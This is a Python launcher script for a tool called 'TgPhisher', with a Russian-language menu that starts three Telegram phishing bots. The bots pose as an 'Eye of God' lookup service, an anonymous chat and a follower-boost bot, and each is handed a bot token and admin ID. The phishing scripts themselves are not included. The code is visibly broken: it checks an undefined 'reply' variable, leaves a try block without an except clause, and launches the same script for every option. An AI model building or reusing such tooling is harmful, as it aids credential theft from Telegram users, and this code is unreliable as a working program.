import subprocess
import sys
import colorama
from colorama import init, Fore, Style
from config import Config
init()

red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT

def open_proj(proj, title, token, admin):
    try:
    # Попытка запуска через "python"
        proc = subprocess.run(["python", f'{proj}.py', token, admin, title], 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, 
                              encoding="utf-8")
        if reply.returncode == 0:
            err = f"Скрипт завершил свою работу\n    Вывод: {proc.stdout}"
        else:
            err = f"При запуске {proj}.py возникла ошибка {proc.stderr}"
    except Exception:
        try:
            proc = subprocess.run(["python", f'{proj}.py', token, admin, title], 
                              stdout=subprocess.PIPE, 
                              stderr=subprocess.PIPE, 
                              encoding="utf-8")
            if reply.returncode == 0:
                err = f"Скрипт завершил свою работу\n    Вывод: {proc.stdout}"
            else:
                err = f"При запуске {proj}.py возникла ошибка {proc.stderr}"
    
            print(f"     Обе попытки запустить {proj}.py не удались.")
    return err
            
import os

def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Очистка экрана

    menu = f"""{blue}
          _______    _____  _     _     _               
         |__   __|  |  __ \| |   (_)   | |                    
            | | __ _| |__) | |__  _ ___| |__   ___ _ __   
            | |/ _` |  ___/| '_ \| / __| '_ \ / _ \ '__|   
            | | (_| | |    | | | | \__ \ | | |  __/ |        
            |_|\__, |_|    |_| |_|_|___/_| |_|\___|_|      
                __/ |                                     
               |___/   {yellow}Telegram:{reset} t.me/immortal_nameless              
                 {yellow}GitHub:{reset} github.com/ImmortalNameless

                    {yellow}1{reset} - {cyan}Запуск фишинг Глаз Бога
                    {yellow}2{reset} - {cyan}Запуск фишинг Анонимного чата
                    {yellow}3{reset} - {cyan}Запуск фишинг Накрутчик бота
                    {yellow}0{reset} - {cyan}Выход

    """
    print(menu)

def main():
    while True:
        display_banner()

        choice = input(f"\n              {yellow}TgPhisher{reset}#{yellow}Run >>{reset} ")

        if choice == "1":
            conf = Config("eog")
            open_proj("eog", conf.title, conf.token, conf.admin)
        elif choice == "2":
            conf = Config("ac")
            open_proj("eog", conf.title, conf.token, conf.admin)
        elif choice == "3":
            conf = Config("sv")
            open_proj("eog", conf.title, conf.token, conf.admin)
        elif choice == "0":
            print("Выход из программы...")
            break
        else:
            print("Неверный выбор!")
if __name__ == "__main__":
    main()
